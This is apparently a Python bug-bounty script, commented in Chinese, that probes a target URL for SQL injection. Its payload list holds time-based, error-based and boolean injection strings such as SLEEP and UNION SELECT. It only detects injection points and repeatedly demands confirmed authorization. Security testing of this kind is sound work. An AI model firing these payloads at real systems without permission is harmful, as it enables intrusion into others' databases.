#!/usr/bin/env python3
"""
BugBounty Toolkit — SQL注入检测脚本（基于时间/错误）
=====================================================
用途: 检测目标是否存在SQL注入漏洞（仅检测，不提取数据）
使用方法:
    python sqli_detector.py -u https://target.com/page?id=1

注意: 仅用于已获得明确授权的安全测试！
      本脚本仅检测注入点是否存在，不提取任何数据。
"""

import argparse
import sys
import time
import urllib.parse
import urllib3
from typing import Optional

import requests

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

BANNER = """
╔══════════════════════════════════════════════════════════════╗
║      ⚠️  SQL注入检测 — 仅限授权测试                          ║
╠══════════════════════════════════════════════════════════════╣
║ 本工具仅检测SQL注入点是否存在                                 ║
║ 不提取任何数据，不进行数据篡改                                 ║
║ 仅用于已获得明确授权的安全测试                                 ║
╚══════════════════════════════════════════════════════════════╝
"""

# 检测用payload（无数据提取，仅检测）
SQLI_PAYLOADS = [
    # 时间盲注检测（延迟很小，不会对目标造成影响）
    ('\' OR SLEEP(1)-- -', 'time'),
    ('\' WAITFOR DELAY \'0:0:1\'--', 'time'),
    ('1\' AND SLEEP(1)-- -', 'time'),
    ('1\' WAITFOR DELAY \'0:0:1\'--', 'time'),

    # 错误注入检测
    ('\' OR 1=1-- -', 'error'),
    ('\' OR \'1\'=\'1', 'error'),
    ('1\' OR \'1\'=\'1', 'error'),
    ('1 UNION SELECT 1-- -', 'error'),
    ('\' UNION SELECT 1-- -', 'error'),

    # 布尔盲注
    ('\' AND 1=1-- -', 'boolean'),
    ('\' AND 1=2-- -', 'boolean'),
]


class SQLIDetector:
    """SQL注入检测器"""

    def __init__(self, url: str, param: str = None, timeout: int = 10, delay_ms: int = 1000):
        self.url = url
        self.param = param
        self.timeout = timeout
        self.delay = delay_ms / 1000.0
        self.session = requests.Session()
        self.session.verify = False
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
        })
        self.baseline_time = 0
        self.baseline_body = ''
        self.findings = []

    def get_baseline(self) -> bool:
        """获取基线响应"""
        try:
            resp = self.session.get(self.url, timeout=self.timeout)
            self.baseline_time = resp.elapsed.total_seconds()
            self.baseline_body = resp.text
            print(f"[*] 基线: HTTP {resp.status_code}, {len(resp.text)}B, {self.baseline_time:.2f}s")
            return True
        except Exception as e:
            print(f"[-] 获取基线失败: {e}")
            return False

    def _build_url(self, payload: str) -> str:
        """构造测试URL"""
        if self.param:
            parsed = urllib.parse.urlparse(self.url)
            params = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)
            params[self.param] = [payload]
            new_query = urllib.parse.urlencode(params, doseq=True)
            return urllib.parse.urlunparse(parsed._replace(query=new_query))
        else:
            # 尝试替换URL中的最后一个数字参数
            import re
            match = re.search(r'(\d+)(?!.*\d)', self.url)
            if match:
                return self.url.replace(match.group(1), urllib.parse.quote(payload, safe=''))
            # 如果没有数字，在末尾拼接
            sep = '?' if '?' not in self.url else '&'
            return f"{self.url}{sep}q={urllib.parse.quote(payload, safe='')}"

    def test_payload(self, payload: str, payload_type: str) -> Optional[dict]:
        """测试单个payload"""
        test_url = self._build_url(payload)

        try:
            start = time.time()
            resp = self.session.get(test_url, timeout=self.timeout + 5)  # 给时间盲注留余量
            elapsed = time.time() - start
            time.sleep(self.delay)

            result = {
                'payload': payload[:50],
                'type': payload_type,
                'status': resp.status_code,
                'length': len(resp.text),
                'time': round(elapsed, 2),
            }

            # 时间盲注检测
            if payload_type == 'time':
                if elapsed > self.baseline_time + 0.8:  # 响应时间明显增加
                    result['evidence'] = f'时间延迟: {elapsed:.2f}s (基线: {self.baseline_time:.2f}s)'
                    return result

            # 错误/布尔注入检测
            elif payload_type == 'error':
                error_signs = [
                    'sql', 'mysql', 'oracle', 'postgres',
                    'syntax error', 'unclosed quotation',
                    'odbc', 'driver', 'db2',
                    'SQLSTATE', 'MariaDB',
                ]
                body_lower = resp.text.lower()
                for sign in error_signs:
                    if sign in body_lower:
                        result['evidence'] = f'发现SQL错误信息: "{sign}"'
                        return result

            # 布尔盲注
            elif payload_type == 'boolean':
                if self.baseline_body and resp.text != self.baseline_body:
                    if len(resp.text) != len(self.baseline_body):
                        result['evidence'] = f'响应内容长度变化: {len(resp.text)} (基线: {len(self.baseline_body)})'
                        return result

            return None

        except requests.exceptions.Timeout:
            if payload_type == 'time':
                return {
                    'payload': payload[:50],
                    'type': payload_type,
                    'status': 'TIMEOUT',
                    'evidence': '请求超时，可能触发了时间延迟',
                }
            return None
        except Exception as e:
            return None

    def run(self) -> list:
        """执行检测"""
        if not self.get_baseline():
            return []

        print(f"\n[*] 测试 {len(SQLI_PAYLOADS)} 个payload...")

        for payload, ptype in SQLI_PAYLOADS:
            result = self.test_payload(payload, ptype)
            if result:
                self.findings.append(result)
                print(f"  [!!] [{ptype}] 发现注入迹象!")
                print(f"       Payload: {payload[:60]}")
                print(f"       证据: {result.get('evidence', 'N/A')}")

        return self.findings

    def report(self):
        """输出报告"""
        if not self.findings:
            print("\n[+] 未检测到SQL注入迹象")
            print("[*] 注意: 无检测结果不代表绝对安全，请结合业务逻辑综合判断")
            return

        print(f"\n{'='*60}")
        print(f"✅ SQL注入检测报告")
        print(f"{'='*60}")
        print(f"\n发现 {len(self.findings)} 个可疑注入点:")
        for i, f in enumerate(self.findings, 1):
            print(f"\n  [{i}] 类型: {f['type']}")
            print(f"      Payload: {f['payload']}")
            print(f"      证据: {f.get('evidence', 'N/A')}")
            print(f"      HTTP: {f.get('status', 'N/A')}")
        print(f"\n{'='*60}")
        print("⚠️  仅用于漏洞报告，请勿用于未授权测试或数据提取")


def main():
    print(BANNER)
    print("[!] 你是否已获得目标系统的书面测试授权？")
    resp = input("输入 yes 继续: ").strip().lower()
    if resp not in ('yes', 'y'):
        print("[!] 未确认授权，退出。")
        sys.exit(1)

    parser = argparse.ArgumentParser(description='SQL注入检测 (仅限授权测试)')
    parser.add_argument('-u', '--url', required=True, help='目标URL')
    parser.add_argument('-p', '--param', help='指定测试参数名')
    parser.add_argument('-d', '--delay', type=int, default=1000, help='请求延迟(毫秒)')
    args = parser.parse_args()

    detector = SQLIDetector(args.url, param=args.param, delay_ms=args.delay)
    detector.run()
    detector.report()


if __name__ == '__main__':
    main()
